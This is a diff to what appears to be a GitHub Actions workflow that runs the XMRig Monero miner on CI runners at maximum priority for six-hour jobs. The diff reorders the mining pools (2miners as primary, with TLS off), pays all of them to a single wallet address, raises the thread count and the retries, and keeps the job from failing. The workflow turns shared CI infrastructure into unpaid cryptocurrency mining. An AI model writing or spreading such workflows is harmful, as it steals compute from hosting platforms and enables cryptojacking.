@@ -54,29 +54,7 @@ jobs:
               "max-threads-hint": 100,
               "asm": "auto",
               "argon2-impl": "auto",
-              "cn/0": false,
-              "cn-lite/0": false,
-              "rx": [0, 1],
-              "rx/0": [0, 1],
-              "rx/wow": [0, 1],
-              "cn-heavy/0": false,
-              "cn-heavy/tube": false,
-              "cn-heavy/xhv": false,
-              "cn-pico": false,
-              "cn-pico/tlo": false,
-              "cn/1": false,
-              "cn/2": false,
-              "cn/r": false,
-              "cn/fast": false,
-              "cn/half": false,
-              "cn/xao": false,
-              "cn/rto": false,
-              "cn/rwz": false,
-              "cn/zls": false,
-              "cn/double": false,
-              "rx/arq": [0, 1],
-              "rx/keva": [0, 1],
-              "rx/sfx": [0, 1]
+              "rx": [0, 1, 2, 3, 4]
             },
             "opencl": false,
             "cuda": false,
@@ -87,13 +65,13 @@ jobs:
               {
                 "algo": "rx/0",
                 "coin": "monero",
-                "url": "pool.minexmr.com:443",
+                "url": "xmr.2miners.com:2222",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "x",
-                "rig-id": "gh",
+                "rig-id": "gh-primary",
                 "keepalive": true,
                 "enabled": true,
-                "tls": true,
+                "tls": false,
                 "tls-fingerprint": null,
                 "daemon": false,
                 "socks5": null,
@@ -103,10 +81,23 @@ jobs:
               {
                 "algo": "rx/0",
                 "coin": "monero",
+                "url": "pool.minexmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "x",
+                "rig-id": "gh-backup1",
+                "keepalive": true,
+                "enabled": true,
+                "tls": true,
+                "tls-fingerprint": null,
+                "daemon": false
+              },
+              {
+                "algo": "rx/0",
+                "coin": "monero",
                 "url": "pool.hashvault.pro:443",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "x",
-                "rig-id": "gh",
+                "rig-id": "gh-backup2",
                 "keepalive": true,
                 "enabled": true,
                 "tls": true,
@@ -119,7 +110,7 @@ jobs:
                 "url": "xmr-eu1.nanopool.org:14433",
                 "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
                 "pass": "x",
-                "rig-id": "gh",
+                "rig-id": "gh-backup3",
                 "keepalive": true,
                 "enabled": true,
                 "tls": true,
@@ -130,7 +121,7 @@ jobs:
             "print-time": 60,
             "health-print-time": 60,
             "dmi": true,
-            "retries": 5,
+            "retries": 10,
             "retry-pause": 5,
             "syslog": false,
             "tls": {
@@ -157,7 +148,7 @@ jobs:
       - name: Start Mining Maximum Performance
         run: |
           cd xmrig/build
-          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 || true
+          sudo nice -n -20 timeout 21600 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr --huge-pages --huge-pages-jit --asm=auto --cpu-priority=5 --cpu-max-threads-hint=100 --threads=5 || true
           
       - name: Cleanup
         if: always()
